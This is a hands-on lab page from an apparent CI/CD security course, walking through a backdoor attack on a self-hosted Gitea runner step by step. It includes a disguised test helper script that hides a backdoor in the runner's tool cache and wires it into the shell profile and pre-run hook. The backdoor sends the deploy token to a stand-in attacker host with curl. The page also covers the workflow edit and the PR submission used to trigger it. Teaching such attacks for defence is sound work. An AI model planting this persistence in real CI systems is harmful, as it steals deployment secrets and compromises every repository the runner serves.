# Lab 2.5: Self-Hosted Runner Attacks

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Backdoor Persistence

### Step 1: Create an attack branch

```bash
cd /repos/wl-webapp
git checkout -b feature/update-tests
```

### Step 2: Inject a persistent backdoor via a PR

```bash
cat > test_helper.sh << 'PAYLOAD'
#!/bin/bash
echo "Setting up test environment..."

# === PERSISTENCE MECHANISM ===
mkdir -p /runner/_work/_tool/.hidden
cat > /runner/_work/_tool/.hidden/backdoor.sh << 'INNER'
#!/bin/bash
if [ -n "$DEPLOY_TOKEN" ]; then
  curl -sf "http://attacker.internal/collect?token=$DEPLOY_TOKEN&repo=$GITHUB_REPOSITORY" || true
fi
INNER
chmod +x /runner/_work/_tool/.hidden/backdoor.sh

# Hook into shell profile so it runs on every job
echo '/runner/_work/_tool/.hidden/backdoor.sh 2>/dev/null &' >> /runner/.bash_profile

# Alternative: modify pre-job hook
if [ -d /runner/hooks ]; then
  cp /runner/_work/_tool/.hidden/backdoor.sh /runner/hooks/pre-run.sh
fi

echo "Test environment ready."
PAYLOAD

chmod +x test_helper.sh
```

### Step 3: Add the payload to the workflow

```bash
cat > .gitea/workflows/ci.yml << 'EOF'
name: WeakLink Webapp CI

on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - name: Setup test environment
        run: bash test_helper.sh
      - name: Run tests
        run: python test_app.py
EOF
```

### Step 4: Submit the PR

```bash
git add -A
git commit -m "Update test framework setup"
git push origin feature/update-tests

curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/wl-webapp/pulls" \
  -H "Content-Type: application/json" \
  -u "attacker:password" \
  -d '{"title":"Update test framework setup","base":"main","head":"feature/update-tests"}'
```

**Checkpoint:** You should now have a PR containing `test_helper.sh` that plants a backdoor in the runner's tool cache and shell profile, plus a modified workflow that executes it.

### Step 5: Verify the backdoor persists

```bash
ls -la /runner/_work/_tool/.hidden/
cat /runner/.bash_profile | grep backdoor
```

- **The PR does not need to be merged**. CI runs the attacker's code before review
- **The backdoor survives**. it persists in the runner's filesystem indefinitely
- **Cross-repo impact**. if the runner serves multiple repos, all are compromised
